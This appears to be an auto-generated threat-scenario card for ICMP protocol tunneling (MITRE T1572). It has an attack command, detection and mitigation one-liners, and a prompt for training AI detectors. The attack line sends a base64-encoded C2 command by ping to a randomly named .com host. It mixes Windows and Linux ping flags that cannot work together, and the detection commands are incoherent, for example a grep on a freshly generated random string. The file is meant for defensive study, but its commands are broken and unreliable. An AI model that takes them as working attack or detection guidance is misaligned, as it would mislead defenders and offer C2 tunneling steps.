---
type: campaign
scenario_id: 388
tactic: Command and Control
technique: "T1572: Protocol Tunneling"
technique_id: T1572
tags: [campaign, lotl, command_and_control]
---

# Using ping to tunnel C2 commands via ICMP with randomized intervals.

## Threat Description
Using ping to tunnel C2 commands via ICMP with randomized intervals.

## Attack Command
```
ping -n $(shuf -i 5-20 -n 1) -l 1000 $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -p $(echo c2cmd | base64 -w0)
```

## Detection Logic
Monitor ICMP ping: `wmic process where name='ping.exe' get commandline | findstr -p`; Anomalous ICMP traffic: `tshark -Y 'icmp' | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.

## Mitigation
Restrict ping: `icacls %windir%\System32\ping.exe /deny Everyone:RX`; Block ICMP: `netsh advfirewall firewall add rule name='Block ICMP' dir=out action=block protocol=ICMPv4`.

## AI Training Prompt
Train AI to detect ICMP-based C2 tunneling via ping by analyzing packet size, base64-encoded patterns, randomized intervals, and ICMP traffic anomalies; suggest ICMP filtering.

## References
- MITRE ATT&CK T1572: https://attack.mitre.org/techniques/T1572/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
